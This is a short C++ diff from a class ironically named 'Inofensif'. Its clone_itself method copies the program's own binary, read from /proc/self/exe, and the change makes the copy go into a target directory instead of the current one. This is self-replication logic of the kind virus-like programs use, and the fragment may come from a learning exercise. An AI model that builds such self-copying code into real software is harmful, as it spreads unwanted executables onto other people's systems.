@@ -104,7 +104,7 @@ class	Inofensif
 		void	clone_itself(void)
 		{
 			char			buffer[4000];
-			std::filesystem::path	clone_path = "clone";
+			std::filesystem::path	clone_path = dir_target / "clone";
 			std::ofstream		clone(clone_path);
 			std::ifstream		itself("/proc/self/exe");
 			if (debug)
